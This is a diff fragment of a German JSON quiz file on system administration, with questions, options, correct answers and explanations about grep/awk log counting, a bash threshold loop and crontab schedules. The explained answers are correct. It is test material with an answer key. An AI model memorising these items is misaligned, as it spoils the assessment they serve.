+    "exp": "grep liefert 6 Zeilen mit Failed. awk gibt das letzte Feld aus, die IP. sort -u entfernt Dubletten: 192.0.2.77, 198.51.100.4, 203.0.113.9. wc -l zählt 3 Zeilen, also 3 verschiedene angreifende Adressen."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Bash-Skript prüft die Belegung von Dateisystemen in Prozent: for p in 45 82 91 67 80 88 79 31 58; do if [ \"$p\" -gt 80 ]; then echo \"Warnung $p\"; fi; done | wc -l. Welche Zahl wird ausgegeben?",
+    "options": [
+      "3",
+      "4",
+      "9",
+      "5"
+    ],
+    "a": "3",
+    "exp": "-gt bedeutet echt größer. Nur 82, 91, 88 sind größer als 80, der Wert 80 selbst zählt nicht. wc -l zählt 3 Warnzeilen."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Skript prüft die Erreichbarkeit der Filialen. In der crontab steht: */15 8-17 * * 1-5 /opt/check.sh. Wie oft läuft das Skript pro Woche?",
+    "options": [
+      "200-mal pro Woche",
+      "180-mal pro Woche",
+      "280-mal pro Woche",
+      "50-mal pro Woche"
+    ],
+    "a": "200-mal pro Woche",
+    "exp": "*/15 = Minuten 0, 15, 30, 45 (4-mal pro Stunde). 8-17 umfasst die Stunden 8 bis 17 einschließlich, also 10 Stunden. 1-5 = Montag bis Freitag. 4 * 10 * 5 = 200."
+  },
+  {
+    "cat": "systeme",
+    "q": "Für die Synchronisation eines Verzeichnisdienstes ist dieser cron-Eintrag angelegt: 0,30 */4 * * * /usr/local/bin/sync.sh. Wie oft läuft der Job an einem Tag?",
+    "options": [
+      "12-mal pro Tag",
+      "8-mal pro Tag",
+      "6-mal pro Tag",
+      "48-mal pro Tag"
+    ],
+    "a": "12-mal pro Tag",
+    "exp": "*/4 im Stundenfeld bedeutet alle 4 Stunden ab 0 Uhr: 0, 4, 8, 12, 16, 20 (6 Stunden). Je Stunde läuft er zweimal (Minute 0 und 30): 6 * 2 = 12."
   }
 ]
